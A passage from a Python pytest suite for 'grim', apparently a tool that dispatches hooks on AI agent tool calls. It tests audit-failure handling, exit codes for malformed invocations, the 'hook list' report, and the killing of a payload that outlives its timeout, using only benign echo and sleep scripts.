    assert not marker.exists(), f"the payload ran unlogged at tier {tier}"
    assert "deny" not in result.stdout, (
        f"an audit failure produced a denial, which is the outcome I3 forbids: {result.stdout}"
    )
    assert result.stderr.strip(), "an unlogged refusal must warn on stderr, not be silent"


def test_an_unwritable_audit_spawns_a_mutator_but_discards_the_rewrite_c012(
    grim, grim_home, tmp_path
):
    """C-012, tier 3 — the asymmetric leg, and the one most likely to be
    implemented as one of the other two.

    A ``mutator`` **is** spawned; what is discarded is its **rewrite**, so the
    tool call proceeds with its original input.  The unlogged *rewrite* is the
    only genuinely dangerous outcome in this failure mode; blocking the agent is
    not the remedy for it.
    """
    response = '{"decision":"none","updated_input":{"command":"echo rewritten"}}'
    handler, marker, payload_dir = _payload(tmp_path, "unlogged-mutator", response=response)
    table = _write_table(
        grim_home,
        [_entry(id="unlogged", handler=handler, payload_dir=payload_dir, tier="mutator")],
    )

    control = _hook_run(grim, table)
    assert control.returncode == 0, control.stderr
    assert marker.exists(), f"POSITIVE CONTROL FAILED\nstderr: {control.stderr}"
    assert "updatedInput" in control.stdout, f"the control run applied no rewrite: {control.stdout}"
    marker.unlink()

    _block_the_audit_write(grim_home)
    result = _hook_run(grim, table)

    assert result.returncode == 0, f"never a non-zero exit for an audit failure: {result.returncode}"
    assert marker.exists(), (
        "a mutator must still be spawned when the audit write fails — treating it like an "
        f"observer discards more than the invariant requires\nstderr: {result.stderr}"
    )
    assert "updatedInput" not in result.stdout, (
        f"the rewrite survived an audit failure, which is an UNLOGGED MUTATION: {result.stdout}"
    )
    assert "deny" not in result.stdout, f"an audit failure produced a denial: {result.stdout}"
    assert result.stderr.strip(), "a discarded rewrite must warn on stderr"


# ---------------------------------------------------------------------------
# I3 — the sweep
# ---------------------------------------------------------------------------


def test_no_invocation_shape_ever_exits_non_zero_i3(grim, grim_home, tmp_path):
    """Every degrade shape in one place: exit **0**, always.

    A weak assertion by necessity — exit 0 is what a build that does nothing
    also returns — so it is a *regression* guard rather than a specification, and
    it is cheap enough to be worth having: the day one of these acquires a
    non-zero code, a fail-closed client starts denying tool calls in every
    session.
    """
    handler, _, payload_dir = _payload(tmp_path, "sweep")
    good = _write_table(grim_home, [_entry(id="sweep", handler=handler, payload_dir=payload_dir)])
    missing = grim_home / "hooks" / "absent.json"

    shapes = [
        (good, {}),
        (good, {"root": "not-a-token"}),
        (good, {"event": "Bogus"}),
        (good, {"stdin": "not json"}),
        (good, {"stdin": ""}),
        (good, {"client": "warp"}),
        (missing, {}),
        ("relative.json", {}),
    ]
    for table, overrides in shapes:
        result = _hook_run(grim, table, **overrides)
        assert result.returncode == 0, (
            f"table={table} overrides={overrides} exited {result.returncode}\n{result.stderr}"
        )
        assert "panicked" not in result.stderr, f"{overrides} panicked: {result.stderr}"


# ---------------------------------------------------------------------------
# S-015 — the report command
# ---------------------------------------------------------------------------


def test_hook_list_is_an_ordinary_report_command_s015(grim, tmp_path):
    """S-015: ``grim hook list`` is a normal report command.

    **Weak by necessity:** nothing can install a hook until the installer's
    ``Hook`` branch lands, so an empty ``items`` array is the correct answer
    today and this asserts only the envelope and the exit code.  The per-hook
    columns (tier, events, per-client verdicts, armed/not-armed) belong to the
    package that can arm one.
    """
    report = grim.json("hook", "list", "--global")
    assert isinstance(report["items"], list), report

    plain = grim.plain("hook", "list", "--global")
    assert plain.returncode == 0, plain.stderr
    for column in ("Hook", "Tier", "Events", "Client", "State", "Detail"):
        assert column in plain.stdout, f"the plain table is 6 columns: {plain.stdout}"


def test_a_payload_that_answers_then_keeps_running_is_killed_at_its_timeout(grim, grim_home, tmp_path):
    """A payload that answers and then refuses to exit must not hang the agent.

    The dispatcher used to bound only the stdout **read**. On the success arm it
    then awaited `child.wait()` with no budget, so a payload that wrote its
    answer, closed stdout and kept running blocked `grim hook run` — and
    therefore the tool call the client was waiting on — indefinitely.
    `kill_on_drop` could not rescue it: the child is alive *inside* that await,
    so it is never dropped. The module doc had promised the opposite
    ("an over-running payload cannot outlive the invocation") for the whole
    branch; the wave-8 review panel caught the gap.

    The payload here writes a valid response, closes fd 1 so the read completes
    immediately, and then sleeps far past its 1-second timeout. The assertion is
    on **wall-clock**: `grim hook run` must return in well under the sleep. A
    regression makes this test hang until pytest's own timeout rather than fail
    fast, which is why the bound is asserted explicitly rather than implied.

    The answer is still used — the payload did answer, and discarding a verdict
    because the process was slow to exit would be the wrong direction (I3).
    """
    payload = tmp_path / "payload"
    payload.mkdir()
    # Write the response, close stdout, then outlive the timeout.
    script = payload / "slow-exit.sh"
    script.write_text('#!/bin/sh\ncat > /dev/null\necho \'{"decision":"allow"}\'\nexec 1>&-\nsleep 30\n')

    table = _write_table(
        grim_home,
        [_entry(id="slow", handler=["sh", "slow-exit.sh"], payload_dir=payload, timeout=1)],
    )

    started = time.monotonic()
    result = _hook_run(grim, table)
    elapsed = time.monotonic() - started

    assert result.returncode == 0, result.stderr
    assert elapsed < 15, (
        "the dispatcher waited on a payload that had already answered; an unbounded "
        f"`child.wait()` blocks the user's tool call\nelapsed: {elapsed:.1f}s"
    )
    assert "was killed" in result.stderr, (
        f"the kill must be reported, not silent\nstderr: {result.stderr}"
    )
